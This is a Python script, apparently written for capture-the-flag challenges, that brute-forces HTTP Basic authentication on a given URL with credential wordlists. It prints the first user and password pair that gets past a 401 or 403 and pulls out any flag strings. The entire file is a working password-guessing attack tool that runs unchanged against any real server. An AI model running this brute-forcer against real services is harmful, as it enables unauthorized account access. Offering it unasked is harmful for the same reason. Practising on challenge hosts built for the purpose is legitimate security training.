#!/usr/bin/env python3
"""HTTP Basic auth brute force.

    python basic_auth_brute.py http://auth1.chal.deti:8060/admin -C ../../wordlists/passwords/default-creds-combo.txt
    python basic_auth_brute.py http://t/admin -U users.txt -P passwords.txt
"""
import argparse
import re
import sys

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("-C", "--combo", help="file of user:pass lines")
    ap.add_argument("-U", "--users")
    ap.add_argument("-P", "--passwords")
    a = ap.parse_args()
    pairs = []
    if a.combo:
        for l in open(a.combo, encoding="utf-8", errors="ignore"):
            l = l.rstrip("\r\n")
            if ":" in l:
                pairs.append(tuple(l.split(":", 1)))
    if a.users and a.passwords:
        us = [u.strip() for u in open(a.users, encoding="utf-8", errors="ignore") if u.strip()]
        ps = [p.rstrip("\r\n") for p in open(a.passwords, encoding="utf-8", errors="ignore")]
        pairs += [(u, p) for u in us for p in ps]
    if not pairs:
        sys.exit("give -C or -U and -P")
    r = requests.get(a.url, timeout=10)
    print(f"[i] unauthenticated: {r.status_code} {r.headers.get('WWW-Authenticate', '')}")
    for u, p in pairs:
        r = requests.get(a.url, auth=(u, p), timeout=10)
        if r.status_code not in (401, 403):
            print(f"[+] {u}:{p} -> {r.status_code}")
            for f in FLAG.findall(r.text):
                print(f"[FLAG] {f}")
            return 0
    print("[-] nothing found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
